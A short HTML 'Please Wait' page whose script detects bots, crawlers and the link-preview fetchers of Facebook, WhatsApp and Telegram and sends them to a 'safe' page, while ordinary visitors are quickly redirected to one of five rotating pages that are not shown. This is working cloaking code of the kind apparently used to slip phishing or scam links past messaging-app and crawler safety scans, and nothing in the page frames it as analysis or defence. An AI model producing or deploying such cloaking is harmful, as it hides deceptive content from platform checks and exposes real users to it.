<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Please Wait</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>

<script>
const pages = [
  "/v1.html",
  "/v2.html",
  "/v3.html",
  "/v4.html",
  "/v5.html"
];

const bots = /bot|crawl|spider|facebook|whatsapp|telegram|preview/i;
if (bots.test(navigator.userAgent)) {
  location.href = "/safe.html";
} else {
  const randomPage = pages[Math.floor(Math.random() * pages.length)];
  setTimeout(() => {
    location.href = randomPage;
  }, 500); // fast redirect
}
</script>

</body>
</html>
